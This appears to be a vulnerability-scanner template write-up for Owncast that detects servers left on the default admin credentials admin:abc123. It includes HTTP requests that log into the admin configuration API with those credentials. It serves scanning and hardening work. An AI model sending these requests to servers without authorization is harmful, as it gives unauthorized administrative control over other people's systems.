# Nuclei Template: Owncast - Default Credentials
**Template ID:** owncast-default-login
**Vulnerability Class:** Use of Default Credentials
**Severity:** High
**Source:** Nuclei Template (`owncast-default-login.yaml`)

## Vulnerability Information & PoC

## Description
Detected Owncast using default admin credentials admin:abc123. The admin API was accessible via HTTP Basic authentication, allowing full server configuration access.

## Steps to reproduce / Exploit Payload
```http
GET /api/status HTTP/1.1
Host: {{Hostname}}

GET /api/admin/serverconfig HTTP/1.1
Host: {{Hostname}}
Authorization: Basic {{base64(username + ":" + password)}}
```

## References
- https://owncast.online/docs/configuration/
- https://owncast.online/quickstart/configure/
